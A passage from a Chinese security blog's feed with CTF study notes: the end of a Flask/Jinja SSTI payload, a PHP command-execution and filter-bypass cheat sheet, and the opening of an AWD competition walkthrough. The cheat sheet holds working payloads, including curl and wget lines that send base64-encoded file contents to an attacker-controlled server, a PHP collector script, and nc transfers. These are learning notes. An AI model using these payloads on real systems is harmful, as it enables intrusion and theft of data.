class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> a<span class="token punctuation">.</span>__name__ <span class="token operator">==</span> <span class="token string">"_wrap_close"</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> a<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__ <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">"renames"</span> <span class="token keyword">in</span> b <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> a<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'rename'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'D://phpstudy_pro//WWW//ssti//1.py'</span><span class="token punctuation">,</span><span class="token string">'D://phpstudy_pro//WWW//ssti//2.py'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最中间语句可以更简单，不过我不会写了</p><p><img src="image-20210609170531704.png" alt="image-20210609170531704"></p><p>修改成功</p><h1 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h1><p><strong>基于PHP的模板引擎</strong></p><h2 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h2><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>Twig模板定义了三个全局变量，这三个变量可在任意位置调用</p><ul><li><code>_self</code>: 引用当前模板；</li><li><code>_context</code>: 引用当前上下文；</li><li><code>_charset</code>: 引用当前字符集；</li></ul><p>注入，在Twig2后已弃用</p><h1 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h1><p><strong><a href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a></strong></p><p><strong><a href="https://xz.aliyun.com/t/3679/">https://xz.aliyun.com/t/3679/</a></strong></p><p><strong><a href="https://ysllz.github.io/2020/10/27/FlaskSSti/">https://ysllz.github.io/2020/10/27/FlaskSSti/</a></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rce学习小结</title>
      <link href="/2021/05/22/rce%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
      <url>/2021/05/22/rce%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="rce-代码执行函数"><a href="#rce-代码执行函数" class="headerlink" title="rce_代码执行函数"></a>rce_代码执行函数</h2><h3 id="eval-执行php代码"><a href="#eval-执行php代码" class="headerlink" title="eval() 执行php代码"></a>eval() 执行php代码</h3><p>eval() 函数把字符串按照 PHP 代码来计算。</p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre><code>eval(phpcode)</code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">phpcode</td><td align="left">必需。规定要计算的 PHP 代码。</td></tr></tbody></table><h3 id="执行代码"><a href="#执行代码" class="headerlink" title="${}执行代码"></a><strong><code>$&#123;&#125;</code>执行代码</strong></h3><p>同eval()函数，常用于eval被过滤时</p><h3 id="assert-检查一个断言是否为-false"><a href="#assert-检查一个断言是否为-false" class="headerlink" title="assert()  检查一个断言是否为 false"></a>assert()  检查一个断言是否为 <strong><code>false</code></strong></h3><p>语法：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span>条件<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#如果条件为错，终止程序执行，可以用于执行命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>相当于：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">if</span><span class="token punctuation">(</span>假设成立<span class="token punctuation">)</span>{     程序正常运行；}<span class="token keyword">else</span>{      报错<span class="token operator">&amp;&amp;</span>终止程序！（避免由程序运行引起更大的错误）  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>普通调用</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//?a=phpinfo()</span><span class="token delimiter">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>assert函数支持动态调用</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//?a=phpinfo()</span><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>php官方在php7中更改了assert函数。在php7.0.29之后的版本不支持动态调用。</strong></p><h3 id="preg-replace-正则匹配替换"><a href="#preg-replace-正则匹配替换" class="headerlink" title="preg_replace() 正则匹配替换"></a>preg_replace() 正则匹配替换</h3><p>语法：preg_replace(正则语句,字符串，要替换的字符串)</p><p>/e参数  : 将字符串当作php代码执行</p><p>执行代码需要使用/e修饰符。如果不使用/e修饰符，代码则不会执行</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'phpinfo()'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/abc/e"</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token string">'abcd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>/e在php7已弃用</strong></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p>语法：create_function(变量部分，方法代码)</p><p>如：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a'</span><span class="token punctuation">,</span><span class="token string">"echo 123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#类似于：</span>fuction <span class="token function">ft</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>php7.3 以弃用</strong></p><h2 id="rce-命令执行函数"><a href="#rce-命令执行函数" class="headerlink" title="rce_命令执行函数"></a>rce_命令执行函数</h2><h3 id="system-执行外部程序，并且显示输出"><a href="#system-执行外部程序，并且显示输出" class="headerlink" title="system()   执行外部程序，并且显示输出"></a>system()   执行外部程序，并且显示输出</h3><p>语法：system(‘命令行命令’)；</p><h3 id="passthru-执行外部命令"><a href="#passthru-执行外部命令" class="headerlink" title="passthru() 执行外部命令"></a>passthru() 执行外部命令</h3><p><strong>passthru()</strong> 函数 也是用来执行外部命令（<code>command</code>）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数。</p><p><strong>语法：passthru(要执行的命令，要提供的参数【可选】);</strong></p><h3 id="exec-执行外部程序"><a href="#exec-执行外部程序" class="headerlink" title="exec() 执行外部程序"></a>exec() 执行外部程序</h3><p>语法：</p><p>exec ( string <code>$command</code> , array <code>&amp;$output</code> = ? , int <code>&amp;$return_var</code> = ? ) : string</p><p><strong>exec()</strong> 执行 <code>command</code> 参数所指定的命令。</p><ul><li><p><code>command</code></p><p>  要执行的命令。</p></li><li><p><code>output</code></p><p>  如果提供了 <code>output</code> 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 <code>\n</code> 字符。 请注意，如果数组中已经包含了部分元素，<strong>exec()</strong> 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 <strong>exec()</strong> 函数之前 对数组使用 <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 函数进行重置。</p></li><li><p><code>return_var</code></p><p>  如果同时提供 <code>output</code> 和 <code>return_var</code> 参数， 命令执行后的返回状态会被写入到此变量。</p></li></ul><p>注意：exec()函数的执行结果不会被直接输出，需配合其他函数使用</p><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>同exec()函数，都不能直接打印出执行的结果</p><p>但exec()函数执行的结果往往时一个总结，而shell_exec()函数使用echo 时会显示详细的结果</p><h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h3><p>同exec()函数用法和特性一致</p><h3 id="ob-start-打开缓冲区"><a href="#ob-start-打开缓冲区" class="headerlink" title="ob_start() 打开缓冲区"></a><strong>ob_start() 打开缓冲区</strong></h3><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。</p><p>使用</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#当缓冲区激活时，所有来自PHP程序的非文件头信息均不会发送，而是保存在内部缓冲区。</span>    <span class="token keyword">echo</span> <span class="token string">"whoami"</span><span class="token punctuation">;</span>    <span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#刷新缓冲区的内容，输出。</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//输出www-data</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>内部缓冲区的内容可以用 <a href="https://www.php.net/manual/zh/function.ob-get-contents.php">ob_get_contents()</a> 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用 <a href="https://www.php.net/manual/zh/function.ob-end-flush.php">ob_end_flush()</a> 函数。另外， 使用 <a href="https://www.php.net/manual/zh/function.ob-end-clean.php">ob_end_clean()</a> 函数会静默丢弃掉缓冲区的内容。</p><p>语法：</p><p>ob_start(output_callback)</p><p>ob_start()中可选择一个output_callback函数传入，并将中间内容传入此函数，在ob_end_flush()时输出</p><p>对命令的执行效果同exec()</p><h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><h2 id="特殊字符过滤"><a href="#特殊字符过滤" class="headerlink" title="特殊字符过滤"></a>特殊字符过滤</h2><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>在bash下，可以用以下字符代替空格</p><pre class="line-numbers language-shell"><code class="language-shell"><${IFS}$IFS$9%09{cat,flag}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="敏感字符绕过"><a href="#敏感字符绕过" class="headerlink" title="敏感字符绕过"></a>敏感字符绕过</h3><ul><li><p>利用变量绕过</p><blockquote><pre class="line-numbers language-linux"><code class="language-linux">$a=l;$b=s;$a$b;a=l;b=s;$a$b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行ls</p></blockquote></li><li><p>利用反斜杠绕过</p><blockquote><pre class="line-numbers language-linux"><code class="language-linux">c\at 1.t\xt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote></li><li><p>利用引号绕过</p><blockquote><pre class="line-numbers language-linux"><code class="language-linux">c''at /f''lagc"a"t /"f"lag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote></li><li><p>包裹拼接联合</p><blockquote><pre class="line-numbers language-linux"><code class="language-linux">a=l;$a's'a=l;$a''s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20210530091233295.png" alt="image-20210530091233295"></p></blockquote></li><li><p>base64编码绕过</p><blockquote><pre class="line-numbers language-linux"><code class="language-linux">echo 'cat' | base64Y2F0Cg==`echo 'Y2F0Cg==' | base64 -d` 1.txt-d 代表decode,解码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote></li><li><p>16进制编码绕过</p><blockquote><pre class="line-numbers language-linux"><code class="language-linux">echo "ls"|xxd6c73 0a`echo "6c73" | xxd -r -p`echo "6c73"|xxd -r -p |bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote></li><li><p>八进制绕过</p></li><li><p>使用<code>$*</code>和<code>$@</code>，<code>$x</code>,<code>$&#123;x&#125;</code></p><p>  注：因为在没有传参的情况下，上面的特殊变量都是为空的</p><p>  <img src="image-20210530094731904.png" alt="image-20210530094731904"></p></li><li><p>过滤文件名绕过（例如过滤/etc/passwd文件）</p><p>  利用正则匹配绕过</p><pre class="line-numbers language-linux"><code class="language-linux">cat /???/pass*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  例如过滤/etc/passwd中的etc，利用未初始化变量，使用$u绕过</p><pre class="line-numbers language-linux"><code class="language-linux">cat /etc$u/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  备注：此方法能绕CloudFlare WAF（出自：<a href="https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/%EF%BC%89">https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/）</a></p></li><li><p>过滤目录分隔符</p><blockquote><p>使用多个管道或多cd绕过</p></blockquote><p>  <img src="image-20210530100850965.png" alt="image-20210530100850965"></p></li><li><p>ip进制转换</p><blockquote><p>ip地址使用点分十进制，先转二进制再转十进制后可以得到一串数字，直接访问得到的数字，同样可以访问目标网站</p><p>如百度：220.181.38.148</p><p>转换后：<strong>3702859412</strong> </p><p>转换网址：<a href="http://www.msxindl.com/tools/ip/ip_num.asp">http://www.msxindl.com/tools/ip/ip_num.asp</a></p></blockquote></li><li><p>同义命令绕过</p><blockquote><p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>sh /flag 2&gt;%261  //报错出文件内容</p></blockquote></li></ul><h4 id="过滤分隔符"><a href="#过滤分隔符" class="headerlink" title="过滤分隔符"></a>过滤分隔符</h4><ul><li><p>可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号</p><p>  功能    符号    payload<br>  换行符    %0a    ?cmd=123%0als<br>  回车符    %0d    ?cmd=123%0dls<br>  连续指令    ;    ?1=123;pwd<br>  后台进程    &amp;    ?1=123&amp;pwd<br>  管道    |    ?1=123|pwd<br>  逻辑运算    ||或&amp;&amp;    ?1=123&amp;&amp;pwd</p></li><li><p><code>?&gt;</code>代替<code>;</code></p><p>  在php中可以用<code>?&gt;</code>来代替最后一个<code>;</code>因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号。</p></li></ul><h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><ul><li><p>命令联合</p><blockquote><pre class="line-numbers language-linux"><code class="language-linux">cat `ls` 等同于 cat 1.txt;cat 1.php ...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210530091727625.png" alt="image-20210530091727625"></p></blockquote><blockquote><p><code>*</code>未过滤使使用<code>*</code>更佳</p></blockquote></li><li><p>文件命令读取</p><blockquote><p>sh命令可读取文件中的命令执行</p><p>\ 可用作命名换行符</p><pre class="line-numbers language-linux"><code class="language-linux">touch 't *;\'ls -t> 'ca\'sh ca\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p>  <img src="image-20210530104005829.png" alt="image-20210530104005829"></p></li></ul><h3 id="无回显情况的命令执行"><a href="#无回显情况的命令执行" class="headerlink" title="无回显情况的命令执行"></a>无回显情况的命令执行</h3><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><blockquote><p>类似 ls &gt; 1 会将ls 命令得到的内容全部导入名为1的文件，访问这个文件即可得到命令执行的结果</p></blockquote><p><img src="image-20210529202135353.png" alt="image-20210529202135353"></p><h4 id="利用自己的服务器发送文件"><a href="#利用自己的服务器发送文件" class="headerlink" title="利用自己的服务器发送文件"></a>利用自己的服务器发送文件</h4><blockquote><p>先在存在命令执行的服务器上开启端口监听</p><pre class="line-numbers language-linux"><code class="language-linux">nc -lnvp 端口号 可以发送给一个文件nc -lnvp 端口号 > 123.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后开启自己的服务器，访问被我们监听的端口，得到数据</p><pre class="line-numbers language-linux"><code class="language-linux">nc -vz -w2 ip地址 被监听的端口号 写入文件nc -v -w2 ip地址 被监听的端口号 < 123.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>若存在命令执行，我们可以直接通过nc命令将木马发给服务器</p></blockquote><h4 id="利用服务器进行监听"><a href="#利用服务器进行监听" class="headerlink" title="利用服务器进行监听"></a>利用服务器进行监听</h4><blockquote><p>在自己服务器上开始端口监听</p><pre class="line-numbers language-linux"><code class="language-linux">nc -lv 端口号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在存在命令执行漏洞的服务器中访问服务器端口</p><pre class="line-numbers language-linux"><code class="language-linux">curl 服务器ip/`命令`例如：curl http://ip:8001/`ls | base64`<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="image-20210529215018111-1622296218513.png" alt="image-20210529215018111"></p><h4 id="在vps上建立记录脚本"><a href="#在vps上建立记录脚本" class="headerlink" title="在vps上建立记录脚本"></a>在vps上建立记录脚本</h4><p>在自己的公网服务器站点根目录写入php文件，内容如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$data</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在目标服务器的测试点可以发送下面其中任意一条请求进行测试</p><pre class="line-numbers language-php"><code class="language-php">curl http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//*.*.*.**/record.php?data=`cat flag.php|base64`</span>wget http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//*.*.*.*/record.php?data=`cat flag.php|base64`</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="通过http请求-dns请求等方式带出数据"><a href="#通过http请求-dns请求等方式带出数据" class="headerlink" title="通过http请求/dns请求等方式带出数据"></a>通过http请求/dns请求等方式带出数据</h4><p>利用doslog：</p><pre class="line-numbers language-bash"><code class="language-bash">curl <span class="token variable"><span class="token variable">`</span>命令<span class="token variable">`</span></span>.域名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="linux-tee命令"><a href="#linux-tee命令" class="headerlink" title="linux tee命令"></a>linux tee命令</h4><p>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。</p><pre class="line-numbers language-bash"><code class="language-bash">用法:<span class="token function">tee</span> file1 file2 //复制文件<span class="token function">ls</span> /<span class="token operator">|</span><span class="token function">tee</span> 1.txt //命令输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="dev-null-2-gt-amp-1类无回显"><a href="#dev-null-2-gt-amp-1类无回显" class="headerlink" title="/dev/null 2&gt;&amp;1类无回显"></a>/dev/null 2&gt;&amp;1类无回显</h4><p>例题：ctfshow-web入门42</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>&gt;/dev/null 2&gt;&amp;1主要意思是不进行回显的意思</code><br>进行命令分隔即可</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">;</span>    //分号<span class="token operator">|</span>    //只执行后面那条命令<span class="token operator">||</span>    //只执行前面那条命令<span class="token operator">&amp;</span>    //两条命令都会执行<span class="token operator">&amp;&amp;</span>    //两条命令都会执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">cat</span> flag.php<span class="token operator">||</span> <span class="token function">cat</span> flag.php<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="无字母数字getshell"><a href="#无字母数字getshell" class="headerlink" title="无字母数字getshell"></a>无字母数字getshell</h2><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>在php中~代表取反操作</p><p>即假设有10011000的二进制，那么~10011000 == 01100111</p><p>这样取反后会得到一串无意义的字符，只要在执行命令时在这串字符前同样加取反符，就可以达成执行命令的目的</p><h3 id="通配符文件执行"><a href="#通配符文件执行" class="headerlink" title="通配符文件执行"></a>通配符文件执行</h3><p>shell中可以使用点来执行文件，如<code>. 1.txt</code></p><p>在存在命令执行的情况下，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>这个文件中写入我们需要执行的命令</p><ul><li><p>通配符</p><blockquote><p><code>*</code> 表示全部的字符</p><p><code>?</code>表示一个字符</p><p><code>[^a]</code>表示除a外</p></blockquote></li></ul><p>只要构造出符合要求的文件，就可以执行成功</p><p><img src="image-20210530112228861.png" alt="image-20210530112228861"></p><p>大致就是这个意思</p><p>文件中无命令，也可以直接读取内容</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="file-文件读取协议"><a href="#file-文件读取协议" class="headerlink" title="file:// 文件读取协议"></a>file:// 文件读取协议</h3><p>语法：</p><pre class="line-numbers language-linux"><code class="language-linux">curl file://【文件绝对路径】<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210530095202808.png" alt="image-20210530095202808"></p><h2 id="phpinfo-之disable-functions"><a href="#phpinfo-之disable-functions" class="headerlink" title="phpinfo()之disable_functions"></a>phpinfo()之disable_functions</h2><p>为了安全,运维人员会禁用PHP的一些“危险”函数,将其写在php.ini配置文件中,就是我们所说的disable_functions了。</p><h3 id="绕过方式分类"><a href="#绕过方式分类" class="headerlink" title="绕过方式分类"></a><strong>绕过方式分类</strong></h3><ul><li>常规绕过：exec,shell_exec,system,passthru,popen,proc_open</li><li>利用环境变量LD_PRELOAD绕过(★)：mail,imap_mail,error_log,mb_send_mail</li><li>利用pcntl_exec绕过</li><li>利用imap_open函数任意命令执行(CVE-2018-19518)</li><li>利用系统组件window com绕过</li><li>利用Apache+mod_cgi+.htaccess绕过</li><li>利用ImageMagick漏洞绕过利用PHP7.4的FFI绕过</li><li>利用 ShellShock绕过(CVE-2014-6271)</li><li>蚁剑插件</li></ul><h1 id="特别鸣谢："><a href="#特别鸣谢：" class="headerlink" title="特别鸣谢："></a><strong>特别鸣谢：</strong></h1><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/107676580">https://blog.csdn.net/qq_44657899/article/details/107676580</a></p><p><a href="https://www.anquanke.com/post/id/162128">https://www.anquanke.com/post/id/162128</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈awd流程</title>
      <link href="/2021/05/20/%E6%B5%85%E8%B0%88awd%E6%B5%81%E7%A8%8B/"/>
      <url>/2021/05/20/%E6%B5%85%E8%B0%88awd%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="浅谈awd流程"><a href="#浅谈awd流程" class="headerlink" title="浅谈awd流程"></a>浅谈awd流程</h1><p>自从上次被虐已经过去了一个月，今天我自己搭建了一个平台，来模拟一次awd</p><p>平台搭建就不说了，自己找个靶场就可以玩</p><p>不过为了模拟效果，我自己搭建了一个平台</p><p><img src="image-20210620104507913.png" alt="image-20210620104507913"></p><p>我选了较为简单的靶场</p><p><img src="image-20210620113251720.png" alt="image-20210620113251720"></p><p>开搞</p><h2 id="手速——awd必做流程"><a href="#手速——awd必做流程" class="headerlink" title="手速——awd必做流程"></a>手速——awd必做流程</h2><p>第一步大家都一样，是个拼速度的工作</p><h3 id="连接xshell"><a href="#连接xshell" class="headerlink" title="连接xshell"></a>连接xshell</h3><p>更改ssh连接密码，如何不想被别人把你的改了，这步可以忽略</p><p>当然大多数情况密码是随机的，所以延后处理</p><p><img src="image-20210620113846062.png" alt="image-20210620113846062"></p><p><strong>连接后直接passwd即可</strong></p><h3 id="连接Xftp"><a href="#连接Xftp" class="headerlink" title="连接Xftp"></a>连接Xftp</h3><p>将网站源代码dump下来</p><p><img src="image-20210620113534534.png" alt="image-20210620113534534"></p><p>直接打包即可，打包后scp到本机，个人感觉用scp命令比直接拖快一点</p><p>这里也是给自己一个备份，不然被打崩了都没法恢复</p><h3 id="找到后台"><a href="#找到后台" class="headerlink" title="找到后台"></a>找到后台</h3><p>进后台，改自己后台密码，你一定不想自己的堡垒机自己进不去，对面改了你的密码疯狂打你</p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><h3 id="快速修复简单的shell"><a href="#快速修复简单的shell" class="headerlink" title="快速修复简单的shell"></a>快速修复简单的shell</h3><p>将源码拖进D盾，这可以让我们快速找到已知的一句话</p><p>当然大多数时候是找不到的</p><p><img src="image-20210620145614203.png" alt="image-20210620145614203"></p><p>找到了几个后门，迅速确定一下，然后关掉它们</p><p><img src="image-20210620145938906.png" alt="image-20210620145938906"></p><p><img src="image-20210620145946523.png" 